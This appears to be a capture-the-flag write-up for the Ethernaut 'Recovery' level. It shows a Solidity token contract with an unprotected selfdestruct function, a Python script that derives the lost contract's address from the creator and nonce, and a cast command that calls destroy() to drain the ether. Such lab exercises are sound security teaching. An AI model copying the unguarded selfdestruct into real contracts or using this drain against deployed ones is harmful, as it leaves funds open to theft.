### Recovery
* A contract creator has built a very simple token factory contract. 
* Anyone can create new tokens with ease. 
* After deploying the first token contract, 
* the creator sent 0.001 ether to obtain more tokens. 
* They have since lost the contract address.

This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
```

### Solution
#### Requirement:
+ The challenge asked us to find the lost `SimpleToken` contract that he created through `generateToken()` of the master contract. And recover the eth inside the lost contract. The eth recovery can easily be done by calling `selfdestruct(<ourAddress>)` function

1. The lost `SimpleToken` contract address can easily be find on etherscan.io. The internal tx tab shows any new contract created by the challenge contract. 

2. Or we can derive manually, since the contract creation address is deterministic. `address = keccak256(RLP(sender, nonce))`. Since the lost contract creation is the first tx by the challenge contract the `nonce` used is `1`.

```python
# to compute:
# address = keccak256(RLP(sender, nonce)) <= the last 20 bytes
import rlp
from eth_utils import keccak, to_checksum_address, to_bytes

def make_contract_address(sender: str, nonce: int) -> str:
    # nonce is not converted to bytes because `to_bytes()` func has dedicated condition for int.
    sender_bytes = to_bytes(hexstr=sender)
    raw = rlp.encode([sender_bytes, nonce])
    h = keccak(raw)
    # take the last 20 bytes
    address_bytes = h[12:]
    # make eip-55 format
    return to_checksum_address(address_bytes)

setup_addr = "0xb0031ad08fB469764019b1B0d8b0D1e1d824fcd3"
_addr = to_checksum_address(make_contract_address(to_checksum_address(setup_addr), 1))
print(_addr)
# 0x036F8111A814B99d1B03Ff6f0D68393F1C137817
```
credit: [mustafaugurozgen](https://github.com/mustafaugurozgen/ethernaut-solutions/blob/main/src/Level%2017%20-%20Recovery.md)

3. Call destroy function on the lost contract.
```bash
$ cast send $TARGET "destroy(address)()" $MY_ADDR  \
      --rpc-url $RPC_URL --private-key $PK
```
